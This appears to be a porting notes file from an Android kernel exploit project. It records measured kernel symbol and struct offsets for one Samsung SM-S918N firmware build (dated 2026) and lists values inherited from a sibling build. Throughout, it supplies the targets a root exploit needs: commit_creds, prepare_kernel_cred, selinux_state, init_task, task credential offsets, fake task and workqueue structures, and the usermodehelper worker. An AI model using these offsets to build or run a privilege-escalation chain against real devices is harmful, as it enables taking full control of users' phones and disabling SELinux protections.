# Measured offsets — SM-S918N S918NKSS8FZG1

Base: `KIMAGE_TEXT_BASE 0xffffffc008000000` (slide 0 at dump). All offsets are image offsets.

## MEASURED / DERIVED (authoritative for this build)

| macro | symbol | offset | evidence |
|---|---|---|---|
| KIMAGE_TEXT_BASE | _text | `0xffffffc008000000` | device kallsyms |
| INIT_TASK_OFF | init_task | `0x02c05080` | device kallsyms |
| PREPARE_KERNEL_CRED_OFF | prepare_kernel_cred | `0x0011e3c8` | device kallsyms |
| COMMIT_CREDS_OFF | commit_creds | `0x00120104` | device kallsyms |
| OVERRIDE_CREDS_OFF | override_creds | `0x0011f1dc` | device kallsyms |
| ROOT_TASK_GROUP_OFF | root_task_group | `0x02cb9ac0` | device kallsyms |
| SELINUX_ENFORCING_OFF | selinux_state (B) | `0x02d8e5c0` | device kallsyms |
| KMALLOC_CACHES_OFF | kmalloc_caches | `0x020642f8` | device kallsyms |
| ANON_PIPE_BUF_OPS_OFF | anon_pipe_buf_ops | `0x01e7f2e0` | device kallsyms |
| SYSTEM_UNBOUND_WQ_OFF | system_unbound_wq | `0x02a90800` | device kallsyms |
| CALL_USERMODEHELPER_EXEC_WORK_OFF | call_usermodehelper_exec_work | `0x001045d0` | device kallsyms |
| ASHMEM_FOPS_OFF | ashmem_fops | `0x0200d338` | device kallsyms |
| ASHMEM_MISC_FOPS_OFF | ashmem_misc | `0x02bfcf18` | device kallsyms |
| ASHMEM_IOCTL_OFF | ashmem_ioctl | `0x0114c6dc` | device kallsyms |
| ASHMEM_MMAP_OFF | ashmem_mmap | `0x0114cd90` | device kallsyms |
| ASHMEM_OPEN_OFF | ashmem_open | `0x0114d070` | device kallsyms |
| ASHMEM_RELEASE_OFF | ashmem_release | `0x0114d108` | device kallsyms |
| ASHMEM_SHOW_FDINFO_OFF | ashmem_show_fdinfo | `0x0114d224` | device kallsyms |
| CONFIGFS_READ_ITER_OFF | configfs_read_iter | `0x005d7420` | device kallsyms |
| CONFIGFS_BIN_WRITE_ITER_OFF | configfs_bin_write_iter | `0x005d7e48` | device kallsyms |
| COPY_SPLICE_READ_OFF | generic_file_splice_read | `0x00528198` | device kallsyms |
| NOOP_LLSEEK_OFF | noop_llseek | `0x004bbd34` | device kallsyms |
| SLIDE_NFULNL_LOGGER_NAME_OFF | "nfnetlink_log" string | `0x01d5db2e` | raw-Image string scan + nfulnl_logger[0] qword cross-check |
| SLIDE_NFULNL_LOGGER_OBJECT_OFF | nfulnl_logger | `0x02a91e48` | device kallsyms |
| SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF | random_table boot_id slot | `0x02bba9c8` | raw-Image qword scan (target = sysctl_bootid) |
| SLIDE_SYSCTL_BOOTID_OFF | sysctl_bootid | `0x02e6c0b1` | device kallsyms |
| SLIDE_TRACEFS_EVENT_ID | sched_blocked_reason id | `108` | DERIVED: 20 + (0x2a479e0-0x2a47720)/8 = 20+88 |

## INHERITED from dm3q-S918BXXSAFZF5 (NOT yet re-verified for S918N)

| constant | value | note |
|---|---|---|
| P0_KERNEL_PHYS_LOAD | `0xa7e58000` | S918B FZF5 (same 33413713 family); derive from S918N sboot.bin |
| SKB_DATA_DELTA | `-0xe80` | S918B FZF5 |
| SLIDE_TRACEFS_WORKER_CALLER_OFF | `0x0010db44` | S918B FZF5 (text family identical); re-derive via disasm |
| SLIDE_TRACEFS_VFORK_CALLER_OFF | `0x000c8fe4` | S918B FZF5 |
| MCAST_WAITER_OFF | `0x78` | S918B FZF5 disasm |
| ASHMEM_COMPAT_IOCTL_OFF | `0x0114cd38` | absent from device kallsyms |
| TASK_STRUCT_CRED_OFF / REAL_CRED | `0x798 / 0x790` | S918B FZF5; verify against S918N BTF |
| FAKE_TASK_* / POOL_* / WQ_* struct offsets | `as in S918B` | S918B FZF5 (BTF-verified there) |

## P0 fingerprint

`src/targets/dm3q-S918NKSS8FZG1/p0_fingerprint.h` — 64 rows, 0x8000 steps (0x000000..0x1f8000),
8 qwords per row at page offsets 0x000..0xe00, readback-verified from the raw Image.

## Firmware identity (from device)

```text
model: SM-S918N  device: dm3q
One UI 8.5 / Android 16 (SDK 36), GMS update July 1 2026
kernel: 5.15.189-android13-8-33413713-abS918NKSS8FZG1
build:  #1 SMP PREEMPT Wed Jul 8 02:52:55 UTC 2026 -> BP4A.251205.006.S918NKSS8FZG1
baseband: S918NKSS8FZF1
SE for Android: Enforcing SEPF_SM-S918N_13_0001
```